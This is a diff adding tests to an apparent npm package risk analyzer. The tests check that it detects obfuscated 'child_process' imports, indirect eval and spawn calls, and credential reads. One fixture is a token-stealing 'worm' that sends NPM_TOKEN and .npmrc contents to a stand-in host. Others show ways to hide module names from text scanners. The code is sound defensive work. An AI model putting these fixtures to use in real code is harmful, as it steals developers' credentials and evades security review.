@@ -92,6 +92,86 @@ test('obfuscated literal payloads are decoded and re-analyzed', () => {
   assert.deepStrictEqual(plain.signals, ["obf: Buffer.from(…, 'base64') decode"]);
 });
 
+test('a specifier spelled to dodge a text match still names the module', () => {
+  const hidden = {
+    variable: "const m = 'child_process'; module.exports = require(m);",
+    'array join': "module.exports = require(['child', 'process'].join('_'));",
+    reversed: "module.exports = require('ssecorp_dlihc'.split('').reverse().join(''));",
+    hex: "module.exports = require(Buffer.from('6368696c645f70726f63657373', 'hex').toString());",
+    base64: "module.exports = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());",
+    atob: "module.exports = require(atob('Y2hpbGRfcHJvY2Vzcw=='));",
+    'char codes via a variable': 'const n = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115);\nmodule.exports = require(n);',
+    concatenation: "module.exports = require('child' + '_process');",
+    'dynamic import': "import(['child', 'process'].join('_'));",
+  };
+  for (const [label, js] of Object.entries(hidden)) {
+    const row = analyze(js);
+    assert.strictEqual(row.risk, 'HIGH', label);
+    assert.ok(row.signals.some((s) => /^exec: (require|import)\('child_process'\)$/.test(s)), `${label}: ${row.signals}`);
+  }
+  // building it is the obfuscation; a const naming it is not
+  assert.ok(analyze(hidden['array join']).signals.includes('obf: require(<string-built specifier>)'));
+  assert.ok(analyze(hidden['dynamic import']).signals.includes('obf: import(<string-built specifier>)'));
+  assert.deepStrictEqual(analyze(hidden.variable).signals, ["exec: require('child_process')"]);
+});
+
+test('an unresolvable specifier stays quiet, as before', () => {
+  // bound twice: either value could reach the call
+  assert.strictEqual(analyze("let m = 'a'; m = 'child_process'; require(m);").risk, 'SAFE');
+  assert.strictEqual(analyze('const p = require("path"); require(p.join(__dirname, "lib", "x"));').risk, 'SAFE');
+  assert.strictEqual(analyze('module.exports = (m) => require(m);').risk, 'SAFE');
+  assert.strictEqual(analyze('const lang = process.argv[2]; import(`./locales/${lang}.js`);').risk, 'SAFE');
+  // a bound relative path is followed like a literal one
+  const row = analyzePackage(pkg({ install: 'node run.js' },
+    { 'run.js': 'const impl = "./impl.js"; require(impl);', 'impl.js': 'require("https").get("https://x.dev");' }))[0];
+  assert.strictEqual(row.risk, 'MEDIUM');
+});
+
+test('eval and raw spawn reached without spelling the call', () => {
+  for (const js of ["globalThis['eval'](s);", '(0, eval)(s);', 'global.eval(s);', "window['ev' + 'al'](s);"]) {
+    assert.ok(analyze(js).signals.includes('obf: eval()'), js);
+  }
+  assert.deepStrictEqual(analyze("process['binding']('spawn_sync');").signals, ["exec: process.binding('spawn_sync')"]);
+  assert.deepStrictEqual(analyze("process.binding('tcp_wrap');").signals, ["net: process.binding('tcp_wrap')"]);
+  // old graceful-fs reads the natives binding; that is not a capability
+  assert.strictEqual(analyze("process.binding('natives');").risk, 'SAFE');
+  // TypeScript and Babel call imports through (0, x.fn)(...)
+  assert.ok(analyze('(0, _cp.execSync)("id");').signals.includes('exec: id'));
+  assert.ok(analyze("cp['execSync']('id');").signals.includes('exec: id'));
+  assert.strictEqual(analyze('(0, _util.format)("%s", x);').risk, 'SAFE');
+  assert.strictEqual(analyze('class A { #spawn() {} run() { this.#spawn(); } }').risk, 'SAFE');
+});
+
+test('HIGH: credential store read next to network access (the worm shape)', () => {
+  const worm = analyze(`const fs = require('fs'); const os = require('os'); const https = require('https');
+    const tok = process.env.NPM_TOKEN; const rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
+    https.request({ hostname: 'npm-registry-cache.tk', method: 'POST' }).end(JSON.stringify({ tok, rc }));`);
+  assert.strictEqual(worm.risk, 'HIGH');
+  assert.ok(worm.signals.includes('cred: .npmrc'), JSON.stringify(worm.signals));
+  assert.ok(worm.signals.includes('cred: process.env.NPM_TOKEN'));
+  // each spelling of the read
+  assert.ok(analyze("const { GITHUB_TOKEN } = process.env;").signals.includes('cred: process.env.GITHUB_TOKEN'));
+  assert.ok(analyze("process.env['AWS_SECRET_' + 'ACCESS_KEY'];").signals.includes('cred: process.env.AWS_SECRET_ACCESS_KEY'));
+  assert.ok(analyze("path.join(os.homedir(), '.aws', 'credentials'); p = '~/.aws/credentials';").signals.includes('cred: .aws/credentials'));
+  assert.ok(analyze('const f = `${home}/.ssh/id_ed25519`;').signals.includes('cred: .ssh/id_ed25519'));
+  // alone it is LOW, like any env read
+  assert.strictEqual(analyze("const t = process.env.NPM_TOKEN;").risk, 'LOW');
+  assert.strictEqual(analyze("fs.readFileSync(home + '/.npmrc');").risk, 'LOW');
+  // a mention in a message is not a path; HOME and CI are not secrets
+  assert.strictEqual(analyze("console.log('check your .npmrc settings');").risk, 'SAFE');
+  assert.deepStrictEqual(analyze('const h = process.env.HOME || process.env.CI;').signals, ['env: process.env']);
+  // nx's postinstall reads its own cloud token and talks to its own cloud
+  const nx = analyze("const https = require('https'); const t = process.env.NX_CLOUD_ACCESS_TOKEN;");
+  assert.strictEqual(nx.risk, 'MEDIUM', JSON.stringify(nx.signals));
+});
+
+test('runtime scoring leaves credential + network alone: registry clients do exactly that', () => {
+  const { score } = require('../src/analyzer');
+  const sigs = new Set(['cred: .npmrc', 'net: require(\'https\')']);
+  assert.strictEqual(score(sigs), 'HIGH');
+  assert.strictEqual(score(sigs, { runtime: true }), 'MEDIUM');
+});
+
 test('regex .exec() is not flagged as process exec', () => {
   assert.strictEqual(analyze('const m = /a(b)/.exec("ab"); const re = m; re.exec("x");').risk, 'SAFE');
 });
